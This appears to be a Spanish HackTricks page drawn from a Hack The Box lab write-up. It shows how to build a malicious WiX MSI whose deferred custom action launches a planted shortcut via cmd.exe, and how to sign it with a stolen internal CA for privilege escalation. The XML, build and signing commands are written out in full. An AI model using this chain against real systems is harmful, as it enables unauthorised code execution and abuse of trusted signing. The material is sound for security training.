# Creación de un MSI con Custom-Action usando WiX

{{#include ../../banners/hacktricks-training.md}}

Esta cadena histórica de Hack The Box utilizó WiX Toolset v3 para crear un MSI que ejecutaba un archivo `.lnk` colocado previamente. **Un MSI no obtiene privilegios automáticamente**: la ejecución se produce en el contexto determinado por la política de Windows Installer, los atributos de la custom action y la persona que lo instala. En el escenario d, el atacante también robó una CA de firma de confianza y colocó el MSI firmado en una carpeta supervisada por otro usuario.<sup>[[1]](#references)[[3]](#references)</sup>

Para comprender exhaustivamente los ejemplos de uso de wix MSI, se recomienda consultar [esta página](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with). Aquí puedes encontrar varios ejemplos que demuestran el uso de wix MSI.<sup>[[2]](#references)</sup>

El MSI ejecuta `C:\Users\Public\Desktop\Shortcuts\rick.lnk`. El XML original de WiX v3 se conserva a continuación:<sup>[[1]](#references)</sup>
```html
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
<Product Id="*" UpgradeCode="12345678-1234-1234-1234-111111111111" Name="Example Product Name"
Version="0.0.1" Manufacturer="@_xpn_" Language="1033">
<Package InstallerVersion="200" Compressed="yes" Comments="Windows Installer Package"/>
<Media Id="1" Cabinet="product.cab" EmbedCab="yes"/>
<Directory Id="TARGETDIR" Name="SourceDir">
<Directory Id="ProgramFilesFolder">
<Directory Id="INSTALLLOCATION" Name="Example">
<Component Id="ApplicationFiles" Guid="12345678-1234-1234-1234-222222222222">
</Component>
</Directory>
</Directory>
</Directory>
<Feature Id="DefaultFeature" Level="1">
<ComponentRef Id="ApplicationFiles"/>
</Feature>
<Property Id="cmdline">cmd.exe /C "c:\users\public\desktop\shortcuts\rick.lnk"</Property>
<CustomAction Id="Stage1" Execute="deferred" Directory="TARGETDIR" ExeCommand='[cmdline]' Return="ignore"
Impersonate="yes"/>
<CustomAction Id="Stage2" Execute="deferred" Script="vbscript" Return="check">
fail_here
</CustomAction>
<InstallExecuteSequence>
<Custom Action="Stage1" After="InstallInitialize"></Custom>
<Custom Action="Stage2" Before="InstallFiles"></Custom>
</InstallExecuteSequence>
</Product>
</Wix>
```
`InstallerVersion` declara la versión mínima de Windows Installer y `Compressed="yes"` indica que el paquete está comprimido. `Stage1` es diferido, pero tiene `Impersonate="yes"`, por lo que se ejecuta con el token suplantado del usuario que realiza la instalación; el cambio de privilegios en este escenario provino del usuario con privilegios que posteriormente abrió el MSI, no de que ese atributo otorgara mágicamente SYSTEM.<sup>[[3]](#references)</sup>

Compila el código fuente en un objeto WiX con `candle.exe`:<sup>[[1]](#references)</sup>
```
candle.exe -out C:\tmp\wix.wixobj C:\tmp\Ethereal\msi.xml
```
Vincula ese objeto a un MSI con `light.exe`:<sup>[[1]](#references)</sup>
```
light.exe -out C:\tmp\Ethereal\rick.msi C:\tmp\wix.wixobj
```
### Paso de firma utilizado en la cadena original

El flujo de trabajo objetivo aceptaba paquetes firmados por una CA interna comprometida. El informe derivó un certificado de firma a partir de `MyCA.cer`/`MyCA.pvk`, creó un PFX y firmó el MSI:<sup>[[1]](#references)</sup>
```powershell
makecert.exe -n "CN=Ethereal" -pe -cy end `
-ic C:\tmp\MyCA.cer -iv C:\tmp\MyCA.pvk -sky signature `
-sv C:\tmp\rick.pvk C:\tmp\rick.cer
pvk2pfx.exe -pvk C:\tmp\rick.pvk -spc C:\tmp\rick.cer -pfx C:\tmp\rick.pfx
signtool.exe sign /f C:\tmp\rick.pfx C:\tmp\Ethereal\rick.msi
```
El atacante colocó entonces el paquete firmado en `D:\DEV\MSIs` y esperó a que el flujo de trabajo/usuario privilegiado lo ejecutara. Conserva esa precondición al adaptar la técnica: sin una ruta de instalación elevada, una política insegura como `AlwaysInstallElevated` o una víctima privilegiada, este paquete se ejecuta únicamente con los permisos del usuario actual.

## References

- [1] [Hack The Box - Ethereal: Creación de un MSI malicioso y obtención de root - Blog de 0xRick](https://0xrick.github.io/hack-the-box/ethereal/#Creating-Malicious-msi-and-getting-root)
- [2] [Una introducción rápida: Crear un instalador MSI con WiX - CodeProject](https://www.codeproject.com/Tips/105638/A-quick-introduction-Create-an-MSI-installer-with) (see also [wixtools](http://wixtoolset.org))
- [3] [Microsoft Learn — Acciones personalizadas de ejecución diferida (`Impersonate`)](https://learn.microsoft.com/en-us/windows/win32/msi/custom-action-in-script-execution-options)
{{#include ../../banners/hacktricks-training.md}}
